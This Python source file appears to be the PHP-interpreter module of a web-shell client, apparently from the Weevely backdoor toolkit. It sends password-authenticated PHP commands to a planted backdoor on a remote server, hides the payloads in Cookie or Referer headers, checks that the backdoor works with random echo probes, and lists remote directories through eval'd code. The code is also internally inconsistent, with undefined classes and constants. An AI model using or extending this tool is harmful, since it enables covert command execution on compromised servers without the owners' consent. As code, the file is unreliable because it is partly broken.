'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleprobe import ModuleProbe
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.parameters import ParametersList, Parameter as P

import random, os

classname = 'Php'


class Php(Module):
    '''Shell to execute PHP commands

    Every run should be run_module to avoid recursive
    interpreter probing
    '''

    params = ParametersList('PHP command shell', [],
                             P(arg='cmd', help='PHP command enclosed with brackets and terminated by semi-comma', required=True, pos=0),
                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
                             P(arg='proxy', help='HTTP proxy'),
                             P(arg='precmd', help='Insert string at beginning of commands'),
                             P(arg='debug', help='Enable requests and response debug', type=bool, default=False, hidden=True)
                        )


    def __init__(self, modhandler, url, password):

        self.cwd_vector = None
        self.path = None
        self.proxy = {}

        self.modhandler = modhandler

        self.post_data = {}

        self.current_mode = None

        self.use_current_path = True

        self.available_modes = self.params.get_parameter_choices('mode')

        mode = self.params.get_parameter_value('mode')
        if mode:
            self.modes = [ mode ]
        else:
            self.args['proxy'] = {}        
        

    def _prepare_probe(self):
        
        # Slacky backdoor validation. 
        # Avoid probing (and storing) if mode is specified by user
        
        if not self.args['mode']:
            if not self.stored_args['mode'] or self.args['just_probe']:
                self.__slacky_probe()
                
            self.args['mode'] = self.stored_args['mode']
        
        
        

        # Check if is raw command is not 'ls' 
        if self.args['cmd'][0][:2] != 'ls':
                
            # Warn about not ending semicolon
            if self.args['cmd'] and self.args['cmd'][-1][-1] not in (';', '}'):
                self.mprint('\'..%s\' %s' % (self.args['cmd'][-1], WARN_TRAILING_SEMICOLON))
          
            # Prepend chdir
            if self.stored_args['path']:
                self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args['path']) ] + self.args['cmd'] 
                
            # Prepend precmd
            if self.args['precmd']:
                self.args['cmd'] = self.args['precmd'] + self.args['cmd']


    def _probe(self):

        for currentmode in self.modes:

            rand = str(random.randint( 11111, 99999 ))

            self.current_mode = currentmode
            if self.run_module('echo %s;' % (rand)) == rand:
                self.params.set_and_check_parameters({'mode' : currentmode}, False)
                break

        if not self.current_mode:
            raise ModuleException(self.name,  "PHP interpreter initialization failed")
        else:
            self._result = self.__do_request(self.args['cmd'], self.args['mode'])
        


    def __do_request(self, listcmd, mode):
        
        cmd = listcmd
        if isinstance(listcmd, types.ListType):
            cmd = ' '.join(listcmd)
        
        request = CmdRequest( self.modhandler.url, self.modhandler.password, self.args['proxy'])
        request.setPayload(cmd, mode)

        msg_class = self.args['debug']

        if self.args['post']:
            request.setPostData(self.args['post'])
            self.mprint( "Post data values:", msg_class)
            for field in self.args['post']:
                self.mprint("  %s (%i)" % (field, len(self.args['post'][field])), msg_class)

        self.mprint( "Request: %s" % (cmd), msg_class)


        try:
            response = request.execute()
        except NoDataException, e:
            raise ProbeException(self.name, WARN_NO_RESPONSE)
        except IOError, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_UNREACHABLE))
        except Exception, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_CONN_ERR))
    
        if 'error' in response and 'eval()\'d code' in response:
            raise ProbeException(self.name, '\'%s\' %s' % (cmd, WARN_INVALID_RESPONSE))
        
        self.mprint( "Response: %s" % response, msg_class)
        
        return response

    def __slacky_probe(self):
        
        for currentmode in self.mode_choices:

            rand = str(random.randint( 11111, 99999 ))

            try:
                response = self.__do_request('print(%s);' % (rand), currentmode)
            except ProbeException, e:
                self.mprint('%s with %s method' % (e.error, currentmode))
                continue
            
            if response == rand:
                
                self.stored_args['mode'] = currentmode
                
                # Set as best interpreter
                #self.modhandler.interpreter = self.name
                
                if self.args['just_probe']:
                    self._result = True 
                    raise ProbeSucceed(self.name, MSG_PHP_INTERPRETER_SUCCEED)
                
                return
        
        
        raise InitException(self.name, WARN_PHP_INTERPRETER_FAIL)
        

    def __ls_handler (self, cmd):

        path = None
        cmd_splitted = cmd.split(' ')
        
        if len(cmd_splitted)>2:
            raise ProbeException(self.name, WARN_LS_ARGS)
        elif len(cmd_splitted)==2 and self.stored_args['path']:
            # Should join with remote os.sep, but this should work (PHP support '\' as '/')
            path = os.path.join(self.stored_args['path'], cmd_splitted[1])
        elif len(cmd_splitted)==2:
            # Is that fallback useful?
            path = cmd_splitted[1]
        elif self.stored_args['path']:
            path = self.stored_args['path']
        else:
            path = '.'

        if path:
            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a));" % path, self.stored_args['mode'])
            
            if response:
                return response
        
        raise ProbeException('', "'%s' %s" % (path, WARN_LS_FAIL ))
            


